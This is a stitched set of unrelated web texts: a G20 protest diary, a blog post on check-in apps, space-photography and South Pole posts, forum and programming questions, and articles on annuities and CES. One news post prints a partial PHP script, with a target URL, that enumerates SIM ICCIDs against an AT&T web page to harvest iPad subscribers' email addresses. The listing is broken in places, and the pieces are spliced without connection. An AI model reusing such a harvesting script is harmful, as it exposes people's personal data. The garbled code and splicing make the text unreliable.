That sucks . ”
For the time being he does the yelling .
Punctuality , it seems , is not high on the protest priority list .
Soon enough dreads and steel - toed boots outnumber police badges and TV cameras , and there are enough people to respectably take to the streets .
The march exits the gardens and heads south on Sherbourne St .
Megaphone Marsha is here now , but it ’s still difficult to get a united chant going .
“ G8 , G20 , they few , we many ” is easy enough — but near the back of the group , basic call and response becomes a demanding test of hearing abilities .
More than once , we demand “ NOW ! ”
And when do we want it ?
“ JUSTICE ! ” Unable to hear what the front section is yelling , the back frequently breaks into rogue chants of its own .
The lack of unity prompts one cop to break his silence .
“ You ’re losing it , ” he warns , grinning .
“ You ’re losing the rhythm ! ”
No one knows it yet , but this is a rare moment of friendly police - protester banter .
It turns out Marsha — note that demonstrators ’ real names are not used in this story — has a voice that does not need a megaphone .
But she uses it anyway .
Our ears suffer .
Still , she ’s good at getting the crowd riled up — for the most part .
Seconds after one demonstrator concludes a passionate speech about flaws in the Children ’s Aid Society , Marsha chimes in with an impromptu chant .
“ C - A - S kills kids ! ” she blasts into the megaphone .
Eyes widen .
Heads turn .
Only a few people join her and the chant dies quickly .
“ Ah , ” Marsha says to herself .
“ That ’s not a good cheer . ”
She shrugs .
After about an hour , people are getting thirsty and hungry , and we ’re all burning under the hot sun .
Enter the protest equivalent of soccer moms .
Volunteers trek through the crowd doling out water and sunscreen , while others carry trays of bread , sliced tomato and cucumber for sandwiches .
One girl with sparkles on her face carries a giant backpack with a sign that reads : Free Food .
Meanwhile , the protest legal team uses markers to scrawl on everyone ’s forearm the phone number to call if arrested .
“ Let ’s hope you do n’t have to use it , ” one says .
Basic safety and health needs ?
Check .
It ’s as parent - approved as civil disobedience gets .
We ’ll see how long that lasts .
Tuesday , June 22 – Google it , officer
A lone woman stands at the corner of Yonge and Gould Sts. wearing a bright pink scarf , ready for today ’s gay rights protest march .
Half a block away a dozen cops on bikes slowly peddle in her direction .
They approach , dismount on the sidewalk and size her up .
“ Are you here to watch our bikes ? ” one officer jokes .
He ’s short and has arms the size of cannons .
His tone is casual , but it ’s obvious he ’s using chit - chat to butter her up .
He wants information .
She says she ’s just waiting for a friend .
“ Hmm , ” he says .
“ Where are you going ? ”
She mumbles something about gender justice and a queer kiss -in .
He reacts like he does n’t know what she ’s talking about .
“ Hmm , ” he says , turning back to his fellow officers .
“ You know anything about a gay kiss - in , Sarge ? ”
The sergeant shakes his head .
Now they ’re both looking at her .
“ Where is it ? ” the cannon - armed cop asks .
“ I ’m not sure , ” she says .
“ Somewhere in the financial district . ”
“ How many people are going ? ”
She shifts uncomfortably .
“ I have absolutely no idea , ” she says .
“ I ’m just checking it out . ”
He appears skeptical .
She jets .
At the meeting point on Queen St. , it ’s not so much a protest as a parade .
Demonstrators are dressed in drag , there ’s a bobble - head Stephen Harper doll in a bra and regular hug - and - kiss breaks .
Sure , protesters speak out against corporate sponsorship of the pride parade and Stephen Harper ’s cuts to international abortion funding .
But they ’re having so much fun singing and dancing in the street , there ’s no time to prepare Molotov cocktails .
Wednesday , June 23 – Provocateurs on both sides
The protester is so close to the police officer ’s bike , he may as well be sitting on the front tire .
“ Move , ” the cop orders .
The protester borrows a defence from his childhood vocabulary .
“ I ’m not touching you ! ” he says , still leaning over the bike .
“ I ’m not touching you ! ”
Even though there have been reports of police instigating arrests , most interactions we ’ve witnessed have been relatively tame on both sides .
But throughout today ’s march — this time for environmental justice — more police - demonstrator exchanges erupt into small confrontations .
It does n’t always begin with provocation from a protester .
The police stir things up , too , usually by discreetly bumping demonstrators when they think no one is looking .
Either way , once someone shouts the shotgun word — “ Intimidation ! ” — people snap into action .
The crowd shifts like a school of fish .
The media swarm .
The most brazen protesters form a ring around the people involved and others hold their video phones and cameras high in the air to capture the action .
Most try to steer clear of the drama .
The officers hold their hands up and practice trained calmness , speaking in steady but firm voices .
“ Intimidation ! ” the crowd accuses .
“ Shame ! ”
“ No justice , no peace — f --k the police ! ”
The police stand stone - faced as the call echoes through the crowd .
It must take incredible patience and willpower not to react .
It ’s hard not to feel sorry for the cops .
They ’re buried under layers of bulletproof vest , dark clothing and bicycle helmets .
They have to stay calm even with scores of people pushing up against them and antagonizers shouting insults .
One protester wears sunglasses tight to his face , an orange baseball hat and black combat boots .
He ’s usually alone , always moving through the crowd and glancing behind him .
Every once in a while he stands in front of the police line shouting “ Woo ! Woo ! ” inches from the cops ’ faces .
We call him Bandana Man because so far he ’s the only masked protester we ’ve seen .
Still , the police are an ever - present reminder of the billion - dollar security spending , the unpopular invasion of Toronto and the global governance system many feel is a failure .
The sheer number of law enforcement officers represents so much of what people in the crowd despise about the G20 .
Later Wednesday — Now entering Protester Central
We descend the stairs of a nondescript building just off Queen St. W. shortly after 7 p.m. and head into what the Toronto Community Mobilization Network calls its convergence space .
We ’re greeted by three people offering pamphlets , maps and giant smiles .
Then we duck under a long black curtain into a massive room lined with beaten - up couches and chairs .
Near the entrance , a table loaded with free vegan food has been set up beside a small kitchen .
Dinner is eagerly snatched up by a few dozen hungry protesters , some settling on the floor to eat when the couches fill up .
Signs cover the black walls .
“ Shhhh ! ” warns one , reminding everyone to be careful what they say — anyone could be listening .
Another says police have been loitering outside asking anyone nearby for identification .
One in particular catches our attention .
“ No Media . ”
The people here , mostly in their 20s and 30s , are a mix of locals and out - of - towners from cities in Canada and the northern U.S.
They chat quietly in small groups as they eat .
Others work in the back of the room , making anti-G20 T - shirts with a silk screen or painting large banners to use in a protest .
A few hours later it ’s off to the Kensington Market for a protest fundraiser .
About 10 people stand outside smoking .
Close to midnight just as many cops appear on foot to check the place out .
Their presence seems unnecessary .
“ This is n’t even a protest , this is just people drinking together , ” says a young man we met at the convergence space .
“ It ’s harassment at this point . ”
He was recently arrested for a G20 - related offence .
His bail conditions ban him from protests so he says he ’s spending most of his time at the convergence space .
He tells us he ’s an anarchist but not of the lighting - things - on - fire variety .
The convergence space is his ideal world : people working together , no hierarchy , decisions made by the community as a whole .
Thursday , June 24 — Stop looking at me
Strict anti-violence rules have made the Indigenous day of rights march the most peaceful protest so far , but paranoia levels are cranked .
One protest medic claims she ’s being followed and that her phone has been tapped .
“ C’mon , ” she says .
“ We ’re just medics . ”
Three people who were leaders at previous events whisper about undercover cops .
“ Look at that couple holding hands , ” one says .
Eyes shift toward the people in question , a man with a shaved head and a woman wearing a ball cap .
They ’re sporting fanny packs , dark sunglasses , running shoes and T - shirts .
They ’re not chanting along with the group or speaking to each other .
Jay , a grey - haired man wearing a T - shirt tucked into blue jeans , taunts police with a bold sign : “ Provocateur Cops Are Suicide Cops . ”
He tells us the undercovers are here to stir up violence that will justify their overwhelming G20 presence .
When Jay sees someone he decides is a cop posing as a protester , he stands directly in front of the person and holds his sign at their eye level .
His message is clear : I know who you are .
“ I can spot them a mile away , ” he says .
So can most people .
Protesters are n’t stupid .
A tall , muscular man , wearing sunglasses and a single ear bud holds a sign with “ Stop Tar Sands ” scrawled in what looks like a child ’s handwriting .
We consider telling him that was yesterday ’s march .
The undercover cops look more like American tourists than demonstrators .
Who brings an iPod to a protest ?
But while the tension between police and protester continues to grow , there are moments of civility .
A thin woman with dreadlocks chats with one of the officers when the march halts for a moment .
They discuss why he became a cop and he asks about her school .
Then she gets down to business .
“ If things get crazy , I want to know if you ’ll be with us , ” she says in a serious but soft voice .
“ Who ’s side are you going to be on ?
Will you join us ? ”
“ I think you know the answer to that , ” he says after a moment ’s silence .
She tells him people need to stick together .
“ Corporations have more rights than we do , and that ’s f--king disgusting . ”
But she smiles anyway as she turns to leave .
“ Nice talking to you . ”
“ Nice talking to you , too . ”
Friday , June 25 – Put your cameras away
Whatever you do , do n’t shoot the anarchists .
A man wearing a CNN media badge makes an attempt and a gloved hand blocks his lens within seconds .
“ No cameras ! ”
Dozens of masked and hooded figures hide behind a large cloth banner .
A few others surround the bewildered cameraman .
“ Put your camera away ! ” they insist .
The CNN reporter enters the scene and protests when the cameraman tells her the anarchists wo n’t let him shoot .
It ’s perfectly legal to take video or photos of anyone in a public space .
“ Your sign says freedom , ” she points out .
“ What about my freedom ? ”
An unmasked man attempts to explain .
If they ’re seen on camera they risk being targeted and arrested .
They need anonymity to express their beliefs .
The reporter says they ’re not practicing the freedom they preach .
A woman wearing a blue hoodie and red bandana offers a suggestion .
“ Go take pictures of the f -- king police . ”

This is the first time the anarchists have made a mass public appearance during G20 protest week .
Most wear an all - black uniform of hooded sweatshirts , combat boots and bandanas tied over their faces .
Only their eyes are exposed .
Bandana
Man is here wearing a pair of garden gloves , the same white shirt from the first day of protest with a black hat and bandana to blend in with his companions .
The sunglasses remain firmly pressed high on his nose .
His eyes are still hidden .
Today ’s march measures in the thousands , so it begins at a grandma pace .
The anarchists join the line on the street and a group of Socialist demonstrators pull up beside them chanting “ Down with capitalism !
Long live socialism . ”
The anarchists stare sideways .
“ Socialism has never worked , ” someone shouts .
Then the anarchists join in .
The next time the unfortunate Socialist with the microphone calls out “ Long live . . . ” the response is a resounding “ anarchy ! ”
The Socialists quickly move forward .
Anarchist chants have a more violent tone than the ones we ’ve been hearing all week .
“ F- F - F - C , firebombing RBC ! ” is a popular one , referring to Ottawa ’s Fighting for Freedom Coalition .
Still , for the most part they look like a bunch of kids .
They snicker when taking over the Socialist chant , joke around with each other and share chunks of cinnamon roll .
The protest march halts just east of Yonge and College Sts.. and swarms of police in riot gear trickle out of every corner .
As with nearly everything this week , the reaction is immediate and frantic .
“ The cops are putting their helmets on ! ” one anarchist shouts .
“ Stay tight , stay tight ! ”
One masked man raises his hands in the air and cracks his knuckles .
Others tighten their bandanas and strap on swimming goggles .
They pull together and raise two banners high in the air on either side of their ranks , creating a makeshift hideaway from police and cameras .
“ Stay tight , stay tight ! ” they shout again , encouraging other protesters to pull in close to help camouflage their activity .
Speculative whispers zip through the crowd .
People soak bandanas in vinegar and pull out earplugs .
A guy wearing a backpack with a purple and white flag sticking out of it pushes through the crowd .
The anarchists pull him into their ranks .
We ’re close enough to see there ’s a bag on his chest containing what appears to be a wooden block .
Masked people on the perimeter of the curtain monitor the police and cameras .
Everyone is waiting for something to happen .
But nothing does .
The crowd moves forward again .
These anarchists are n’t part of the scuffles that break out between police and protesters a block down the road .
They shout “ Shame ! ” and “ Let them go ! ” when the cops detain and arrest a few protesters , but the group stays tight .
They seem to have bigger plans .
The march stops again at University and Elm Sts. , where police have blocked protesters from going further south .
There ’s movement from behind the still - raised banners and a few anarchists on the outskirts are whispering .
“ Now ?
Are we doing it now ? ”
“ Get ready . ”
A man and a women wearing coloured masks run out of the centre of the anarchist bubble .
“ Does anyone have an epi-pen ! ” they shout .
“ Epi-pen ! ”
Word spreads like fire and within 10 seconds a medic shoots through the crowd at full speed , an epi-pen in hand .
But she ca n’t find the person who needed it .
The anarchists pretend to know nothing .
“ That ’s not something to joke about , ” a protester says .
The medic speculates it was a distraction .
The anarchists form a group huddle again .
This time they pull the two banners tight and high over their heads .
Unmasked protesters on the outside encourage the crowd to pull tight and help hide them .
Some are from the convergence centre crowd .
Beneath the banner are dozens of backpacks on the ground and hands pulling things out of them .
It looks like the anarchists are preparing for battle .
Other protesters stare .
Are they getting ready to go for the wall ?
Up ahead the crowd begins to move forward .
“ Ready ! ” someone shouts from the centre of the anarchists .
In half a second , the banners are down and gone , the group is moving forward and the sea of black has disappeared .
The anarchists are gone .
In their place are people in T - shirts , dress shirts , slacks , blue jeans , caps and even a Tilley hat .
But there are a few telltale signs .
Combat boots and black socks protruding from ankle - length pants .
Sweat - soaked hair .
Knowing smirks on the faces of people with familiar eyes .
The crowd marches on and the opening notes of Blackstreet ’s “ No Diggity ” blares out of a loudspeaker on the back of a truck ahead .
The protesters break into a forward - moving street dance .
It ’s Anarchy the musical .
Saturday , June 26 – Blending in
The anarchists are in disguise .
That is , they ’re dressed like everyone else .
Throbbing drums sound and rain pours from the sky when we arrive for the final G20 protest at Queen ’s Park .
Gradually , the anarchists form an umbrella huddle — black umbrellas , of course .
Their eyes and shoes are by now familiar to us .
One guy with a beard and grey hoodie is on the lookout , eyeing anyone glancing in the group ’s direction .
Others standing by wonder aloud if they are today ’s troublemakers .
“ There they are , ” one curious protester says , motioning towards the group now tying bandanas tight to their faces .
More familiar faces congregate .
Plastic black horns sound off — a signal to anarchists to gather and prepare for the march .
The sea of black has grown .
Yesterday ’s anarchists have friends — lots of them .
The pace is quick .
“ Smash the state ! ” they yell , the volume increasing with every repetition .
Deep within the mass of black , one man offers earplugs .
“ Do you have an extra pair ? ” he is asked .
He hands over two sets .

Man does n’t take as much care to protect his identity today — he keeps tipping his glasses up to reveal his eyes — but he is in charge of blocking others from the despised camera people .
He uses an umbrella to block anyone in their path who he sees with a camera .
The marching speeds up as we head down University Ave.
Anarchists and other militant protesters break off from the peaceful marchers and head down Queen St .
We reach John St. and begin to trudge south .
From the depths of the circle someone yells instructions to push south , towards the barrier across John St. being formed by a line of cops in full riot gear .
We charge forward .
Police and protesters clash in a blur of shields , sticks and batons .
One guy in a blue T - shirt has a flagpole with a sharp edge .
He is at the front of the line smashing police over the head with it .
When that does n’t have any effect he uses it like a sword , trying to stab police with it .
Police charge forwards again .
For a moment , it feels like the crowd will collapse back on itself .
Batons force everyone back .
An older woman wearing a yellow jacket gets stuck trying to capture the action on her phone .
Police push forward , trapping her between their shields and the metal fence of a Second Cup patio .
Protesters on the other side of the fence grab her and pull her over the fence .
Out of nowhere , a man with what looks like a hammer or an ice pick runs up to the curb , kneels , and smashes the pick five times into the curb .
Then he runs away .
Only three or four people witness this and look completely bewildered .
“ Move back ! ” police yell in low , loud voices .
“ We have to back up or they ’ll f-- king come from the behind , ” says a man with a black baseball cap nearby .
“ Go west ! ” he yells .
Those around him echo the calls , spreading the directions for the next move .
It ’s the first of many reroutes .
The mob charges west on Queen St. once more .
“ Who ’s streets ?
Our streets ! ”
The shout is chanted with unprecedented intensity .
We congregate at the corner of Queen and Spadina Sts .
Within the mass of anarchists , leaders begin organizing the next move .
“ Spokescouncil , send a member ! ”
Another anarchist huddle , this time with members from all masked groups present .
Others wait for instruction .
“ Forward ! ”
They proceed , unstoppably , east on Queen St .
The police might keep them from getting to the fence , but they are n’t going to take away their grand finale .
Cameras flash .
The world is watching .

Flickr / Artificial Ignorance Most " normal " people we know want absolutely nothing to do with location - aware services like Foursquare and Loopt that let you " check - in " to restaurants and bars , letting your friends know where you are at any given moment .
A lot of these people say they would never join a service like that ; they do n't feel comfortable sharing that information , and they do n't see the point .
We think they 're wrong , just like all the people -- including us -- who said they 'd never join Facebook were wrong .
Here 's why .
Check - in apps are rapidly becoming more focused on deals -- coupons and discounts that are only available to people using these services .
Loopt CEO Sam Altman describes his new app as " a virtual loyalty card " for participating businesses .
That 's a telling analogy .
As Kevin Drum of Mother Jones recently pointed out , the effect of widespread loyalty cards in retail businesses -- supermarkets and pharmacies in particular -- has been the creation of a tiered pricing system .
A universally adopted coupon system can't change the average price of goods , so the lower prices for participating customers are ultimately subsidized by higher prices for everyone else .
Average savings on services from daily deal sites ( via the obviously interested parties at aggregator Yipit ) .
Yipit More recently , Groupon and its clones have created the same dynamic with services like massages and facials .
There are now so many daily deals for these services that anyone who lives in a major city and pays full price for a massage is being lazy and financially irresponsible .
As more of these businesses ' traffic comes from deal sites , the ' nominal ' price will essentially become an " idiot tax " , subsidizing the prices everyone else pays .
As Groupon - style startups and location - based services both become larger and more numerous , this will be true of ever more categories of local spending .
So sure , you can keep your location data to yourself .
But it 'll cost you -- and you 'll be paying for our drinks .
I have two more amazing images for you !
Both show the same thing -- the International Space Station crossing the Sun -- but in different ways .
The first is , once again , from Thierry Legault :
Wow !
You can clearly see the station ( with Atlantis docked on the left ! ) as it crosses the Sun .
Here 's a slight closeup :
There 's a nice sunspot pair there in the upper right ; the one on the right looks like a face , actually .
Cute .
This shot was taken at 1/8000th of a second , which froze the action nicely .
He has higher resolution pictures on his webpage for this event .
The second picture is slightly different :
It was taken by Heiko Mehring and obviously shows a series of silhouettes as the ISS and Atlantis crossed the Sun .
You can clearly see the same sunspots , but the path of the spacecraft is slightly different , and the spots look a bit different as well .
The equipment Heiko used was less fancy than what Thierry has , but you can still see a lot of detail in the image .
It really is amazing that we can see such detail on the station from the ground !
I suspect the atmosphere was steadier at Thierry 's observing site too ; in the images on his page you can see the granulation on the surface of the Sun .
Those granules are vast columns of hot gas rising to the Sun 's surface , cooling off , then sinking again .
It 's a grand version of the convection that happens when you boil water in your teapot !
[ Update : A third site with a great shot of the transit was pointed out in the comments below .
I wonder how many more are out there ? ]
These kinds of shots take a lot of planning , a lot of experience , and a bit of good fortune ( or whatever politically correct term skeptics are supposed to use these days ) .
When I was younger I shot a LOT of film of the Moon , and got maybe a 10 % success rate if I was doing well .
Digital cameras and the Internet make it a whole lot easier to get spectacular shots like these .
I 'm glad to see more people tackling these difficult shots , and expect that we 'll be seeing lots more like these as time goes on .
Tip o' the dew cap to Thierry Legault and Jan Sorg for sending these to me .
Here is the script referenced in the Gawker story from earlier that describes how a number of early iPad 3G subscribers , including names like Harvey Weinstein , Michael Bloomberg , Diane Sawyer , and Rahm Emanuel had their e-mails revealed via a poorly designed web application hosted by AT&T .
Goatse Security , named for the famous Internet shock image , wrote the script to harvest e-mail addresses by providing ICC - ID numbers ( integrated circuit card identifier , a number that associates a SIM card with a subscriber ) and parsing the returned e-mail address .
After speaking with Goatse Security member Weev , he was kind enough to share the script :
<? php
// iPad 3G Account Slurper
//
// Usage : ./ipadump.php ICCID - base count
// ( The script generates the final checkdigit to produce ICCIDs from the entered base )
$ useragent= " Mozilla /5.0 ( iPad ) " ; //Spoof as iPad
$ ICCIDroot = $ _SERVER [ ' argv ' ] [ 1 ] ;
$ ICCIDcount = $ _SERVER [ ' argv ' ] [ 2 ] ;
function genluhn ( $ number ) { // Crappy home - made Luhn checkdigit generator
$ i = strlen ( $ number ) - 1 ;
do {
$ array [ ] = $ number [ $i ] ;
$i--;
} while ( $ i > - 1 ) ;
$ i = 0 ;
foreach ( $ array as $ digit ) {
if ( !( $ i & 1 ) ) {
$ digit = $ digit * 2 ;
if ( $ digit >= 10 ) {
$ digit = $ digit - 9 ;
}
}
$ total = $ digit ;
$ i ;
}
$ luhn = 10 - ( $ total % 10 ) ;
if ( $ luhn == 10 ) $ luhn=0 ;
return $ luhn ;
}
while ( 1 ) { // Continue FOREVER

Terribly sloppy

$ errnum = strip_tags ( $ match [ 0 ] ) ;

Bad
logic , will fix .

There are probably a few things worth pointing out .
They had to set the user - agent string to be the iPad as shown :
$ useragent= " Mozilla / 5.0 ( iPad ) " ;
The vulnerable URL at att.com was :
https://dcp2.att.com/OEPClient/openPage?ICCID=Insert number here &IMEI=0
And that ’s it , an e-mail address gets returned in the successful iterations ( active ICCID ) and parsed .
There ’s no complex hack , no real infiltration or passage of an authentication mechanism , and no breach , just a really poorly designed web application that returns e-mail address when ICCID is passed to it .
You guys know I ’m a big fan of key commands .
This one kinda feels like a shirt , too .

Amundsen - Scott South Pole Station , January 2006 .
The new elevated station nears completion .
In the foreground is the ceremonial South Pole and the flags for the original 12 signatory nations to Antarctic Treaty .
The South Pole experienced its warmest year on record in 2009 , according to newly released data from the Amundsen - Scott South Pole Station .
The average temperature at the South Pole last year was still a bone - chilling minus 54.2 degrees Fahrenheit ( minus 47.9 degrees Celsius ) in 2009 , making it the warmest year on record since 1957 , when temperature records began at the South Pole , as was reported by Peter Rejcek , an editor for The Antarctic Sun , a part of the U.S. Antarctic Program funded by the National Science Foundation .
The previous record high was minus 54.4 F ( minus 48 C ) , recorded in 2002 , according to Tim Markle , senior meteorologist at the South Pole Station in Antarctica .
Last year was also the second warmest year on record for the planet , according to NASA measurements of global surface temperatures released earlier this year .
The global record warm year , in the period of near - global instrumental measurements since the late 1800s , was 2005 .
Until 2010 , the South Pole has actually gone two straight winters without dipping below the minus 100 F ( minus 73 C ) barrier — especially worrisome for those looking to join the exclusive South Pole 300 Club ( to gain admission , " Polies " pile into a 200 F ( 93 C ) sauna and then run outside in the minus 100 F cold to the geographic pole wearing their boots and little else ) .
The mercury dropped to minus 99.9 F ( minus 73.3 C ) and minus 98.0 F ( minus 72.2 C ) in 2009 .
That second temperature also represents the warmest minimum temperature recorded for a calendar year , Markle told The Antarctic Sun .
In 2007 , the temperature plunged below minus 100 F for only about a minute on Sept. 2 , Markle added , meaning that the last three calendar years did n't significantly reach minus 100 F .
However , this April , the South Pole Station recorded an unseasonably early 22 minute dip below 100 F .
" Again , not really all that long , " Markle said .
" However , it was certainly the coldest temperature since Sept. 2 , 2007 , and a long enough duration for one group of Polies to achieve membership status into the 300 Club . "

But this is a good initiative anyway ..
Thats exactly what I 'm looking for in terms of fps .
Made a thread requesting someone add the ability to records at constant 30 fps and from my testing the framerate only drops when recording indoors or in low light conditions .
The indoor lighting slows everything down but out side it records perfectly and smooth .
If we can get that fixed by an android pro that would be great .
As for 720 p I still think thats a hardware limitation somewhere in the lense or motherboard .
If it was hardware possible , how come google didnt include that from the start ?
Police in Northern Ireland have admitted that it was inappropriate to play ice - cream van music in a bid to calm rioting youths on the edge of west Belfast last weekend .
An officer in a police vehicle under attack played the music in an attempt to defuse the violence on the same estate where IRA hunger striker Bobby Sands once lived .
Youths were throwing bottles at a Land Rover vehicle on the Twinbrook estate last Saturday when the officer used the tannoy to play the tunes .
The police said an officer had used humour to defuse the situation and the trouble had stopped .
However , a senior officer has spoken to the officer involved .
Police were called to Glasvey Drive in Twinbrook on 22 May where they passed a group of about 15 youths who began throwing bottles at their vehicle .
The Police Service of Northern Ireland said : " An officer used the vehicle 's tannoy system to play music to the youths in an effort to use humour to defuse the situation .
" The youths stopped throwing the bottles .
However , police accept that this was not an appropriate action .
" The officer has been spoken to by a senior officer in order to establish the circumstances of the incident . "
A local Sinn Féin councillor , Angela Nelson , said the officer 's actions " beggared belief " .
" The PSNI are put on the streets to do a serious job and that is to keep order on the streets and face down antisocial elements .
This is like a sick joke .
" It goes against everything we are trying to solve and eradicate in the area . "
However , Basil McCrea , of the Northern Ireland Policing Board , said the police needed to be resourceful when engaging with the community .
He said : " This officer showed initiative and should be commended " .
“ We ’re giving relief to ‘ average , good American people ’ not ‘ minorities ’ or ‘ defective ’ people ”
Our heartiest congratulations go out to Representative Paul Kanjorski , winner of the much - coveted IHTM Idiot of the Day Award .
Rep. Paul Kanjorski , a Pennsylvania Democrat told a House - Senate committee that , “ We ’re giving relief to ‘ average good American people ’ not ‘ minorities ’ or ‘ defective ’ people . ”
If a Republican had made a comment like that , the shrieks of liberal indignation would be deafening .
But since Kanjorski’s a Democrat , only the silence is deafening .

I 've written a small Haskell program to print the MD5 checksums of all files in the current directory ( searched recursively ) .
Basically a Haskell version of md5deep .
All is fine and dandy except if the current directory has a very large number of files , in which case I get an error like :
< program > : < currentFile > : openBinaryFile : resource exhausted ( Too many open files )
It seems Haskell 's laziness is causing it not to close files , even after its corresponding line of output has been completed .
The relevant code is below .
The function of interest is getList .
import qualified Data .
ByteString .
Lazy as BS main :: IO ( ) main = putStr .
unlines =<< getList " . " getList :: FilePath -> IO [ String ] getList p = let getFileLine path = liftM ( \c -> ( hex $ hash $ BS.unpack c ) ++ " " ++ path ) ( BS.read File path ) in mapM getFileLine =<< getRecursiveContents p hex :: [ Word8 ] ->
String hex = concatMap ( \x -> printf " %0.2 x " ( toInteger x ) ) getRecursiveContents :: FilePath -> IO [ FilePath ] -- ^
Just gets the paths to all the files in the given directory .
Are there any ideas on how I could solve this problem ?
The entire program is available here : http://haskell.pastebin.com/PAZm0Dcb
Edit : I have plenty of files that do n't fit into RAM , so I am not looking for a solution that reads the entire file into memory at once .

Calculators : Figure what you 'll need to retire by using our Retirement Planning caclulators Archive : Read more about retirement planning DES MOINES 
What happens when the government considers tinkering with retirement accounts and asks for citizen input ?
It gets plenty .
Government officials began seeking comments in February on a proposal to add an annuity option to retirement plans .
Such an option would potentially turn a portion of a retiree 's savings over to an insurance company in exchange for a monthly check .
Annuities reduce the chance retirees will outlive their savings .
In addition , the risk of losing money if the stock market drops is minimized .
However , retirees lose the upside potential of the stock market , and the flexibility to spread out their investment portfolio , in exchange for a monthly check .
The departments of Labor and Treasury requested input on the annuity issue as they pondered solutions to a serious problem that plagues current savings plans retirees running out of money .
The government expected the usual responses from insurance and investment industry groups , but not hundreds of letters and e-mail from workers and retirees .
" KEEP YOUR SLIMEY HANDS OFF MY MONEY , " says one letter .
By the May 3 deadline , 700 responses were received , far more than usual .
" The ( proposal ) was not even out on the street for an hour and we started getting these comments , " said Phyllis Borzi , the assistant secretary of Labor in charge of employee benefits .
" I do n't think anybody here has ever had anything quite like this . "
By comparison , a recent request for comments on retirement account investment advice rules attracted just 24 letters .
The Center for Retirement Research at Boston College estimated in an October study that nearly half of U.S. households will not have enough income to maintain a preretirement standard of living , even if they work to age 65 .
The problem is getting worse as companies continue to eliminate pensions and workers must save on their own through a 401 ( k ) plan .
Most do n't save enough .
In addition , the stock market downturn in late 2008 and early 2009 reduced retirement accounts by an average of 30 % .
Although market returns have helped many regain lost ground , workers within a few years of retirement wo n't have time to recoup their losses .
The Employee Benefit Research Institute says nearly half of the oldest baby boomers those born between 1948 and 1954 who earn an average of nearly $ 41,000 per year , are at risk of not having enough money to meet basic expenses and medical costs not covered by insurance .
The government 's proposal under consideration would change federal rules to allow a portion of 401( k ) and Individual Retirement Accounts to be used to buy an annuity that would provide retirees a guaranteed monthly income for life .
Although there are many types of annuities , they are investment products sold by insurance companies .
The buyer turns over a sum of money in exchange for receiving a monthly check either for life or a specified number of years .
Few existing 401 ( k ) plans offer an annuity option .
A 2009 Hewitt Associates survey said just 7 % of employers include such an option inside the 401 ( k ) plan and 2 % plan to add the option this year .
About 14 % of employers offer annuities as the form of payment for final distribution , when a worker leaves the company to retire .
It may take some persuading to get investors to buy into the annuity idea .
Many oppose it because they 'd rather be in control of how they spend the pile of money they 've accumulated and they do n't like the risk of losing it if they die early .
Significant education will also be needed to explain the complex annuity contracts .
Workers with a 401 ( k ) often transfer their savings into an IRA after they leave their job or retire , investing the money in a mix of stocks and bonds .
Most retirees withdraw enough to supplement Social Security and hope market conditions allow them to earn enough to make the money last .
With many retirees living into their 80s , however , accounts dwindle and it's becoming more common to outlive one 's nest egg .
Borzi says the plan was never to force anyone to buy an annuity , but many comment letters indicate that 's how many people interpreted the proposal .
The government 's request for information asked for responses to the questions :
Should some form of lifetime income distribution option be required for defined contribution plans ?
If so , should that option be the default distribution option , and should it apply to the entire account balance ?
Many saw that as an indication the government is considering requiring some or all of an account to be converted into an annuity .
" I strongly oppose the idea of the government taking away my hard - earned savings in exchange for an annuity , " wrote Robert Newman , of Wentzville , Mo . Some said they will pull money from retirement accounts , even if they have to pay a penalty , to get it out of the government 's reach if annuities are required .
" I am appalled and insulted that you would consider yourself in a better position than I to know what is best for me in regard to my own money , " wrote Steven Gruber , of Syosset , N.Y.
Borzi said the intent is to consider whether employers should be required to offer annuities or other alternatives for workers and not as a requirement for them to buy anything .
" This is all about giving people choices , " she said .
The 401 ( k ) industry likely will not add an annuity option unless the government requires it , said Nancy Jones , a spokeswoman for Allianz Life Insurance Co. , which sells annuities .
When you 've got an industry that 's pretty well entrenched , having some sort of requirement will promote an annuity option in a much stronger way than just telling employers " we encourage you to do this , " Jones said .
Industry groups and individual companies generally support the idea of choice but oppose mandates .
New York Life Insurance Co. , a leading annuities provider , said the government should encourage annuitization , perhaps through a tax incentive , but not require it .
Forcing annuities on people could create a backlash , said Tom Kmak , CEO and founder of Fiduciary Benchmarks , a company that provides fee data to retirement plan providers .
" If you mandate that everybody puts their money into an annuity , what happens to the guy who dies at 69 and his widow is now not going to get $ 230,000 because the annuity was purchased for a 20 - year period and he lived for two ( years ) ? "
The volume of letters and range of issues raised may lead to public hearings or round - table discussions to further explore some of the concerns , Borzi said .
It 's too early in the process to determine what changes the Labor Department might propose and whether Treasury officials revise tax rules to encourage annuities .
" If the comments turn out that people are saying to us the market is handling this go away , we can , " Borzi said .
The government could end up doing nothing , she said .

( Mashable ) --
In the 1990s , many of us began our online experience , likely over a dial - up connection .
In the 2000s , broadband redefined the way we use the Internet , enabling advancements like online video and social networking to flourish .
And if the first major technology event of the new decade -- CES -- is any indication , the 2010s are going to bring about another quantum leap in the way we work , play and communicate as the Internet becomes embedded in virtually everything we do .
In the living room
One of the more prominent trends at CES was Internet connected TV .
The Boxee Box -- a device that connects to your television and lets you play videos and music from the Web took home the show 's " Last Gadget Standing " award .
DivX is making a similar play to bring content from the Internet to television , but doing so without any additional hardware required .
Beleaguered Internet giant
Yahoo is also betting big on this trend with a slightly different angle as it tries to reinvent itself .
Through its Connected TV service , Yahoo is enabling users with Internet connected televisions to do things like access their playlists , communicate with friends on Facebook and Twitter , and get stock quotes from CNBC , using the familiar concept of widgets that 's become so popular on the Web .
There 's a good chance your next TV might feature Connected TV too --
Yahoo has already done deals with LG , Sony , Samsung and Vizio .
Yet another new product in the Internet TV space comes from Samsung , who is borrowing the " app store " concept from Apple 's iPhone to create a marketplace for applications that run on your HDTV .
And much like there always seems to be " an app for that " on iPhone , expect Samsung and its application makers to provide you with everything from weather to games to streaming movies from Netflix .
Finally , do n't forget about Microsoft .
The company 's CEO Steve Ballmer devoted a significant portion of his opening keynote speech to Xbox Live , its platform that connects the console to the Web for social gaming and other forms of digital content .
In the years ahead , Xbox Live will become a platform for much more and be the 800 pound gorilla in the room going head - to - head with other companies looking to capitalize on the Internet connected TV trend .
In the mobile workplace
Moving from the living room to the office , we 're about to become an even more always - on , always connected culture .
Beyond a variety of new smartphones -- including Google 's much talked about Nexus One -- the booths of CES were filled with tablet computers , e-readers and netbooks that close the perceived gap between smartphone and laptop .
That gap can be defined as one of size ( laptops are too big and cumbersome for that tiny seat in Coach while smartphones are too small for lengthy typing ) and function ( laptops need wifi or a broadband card to access the Web on the go ) .
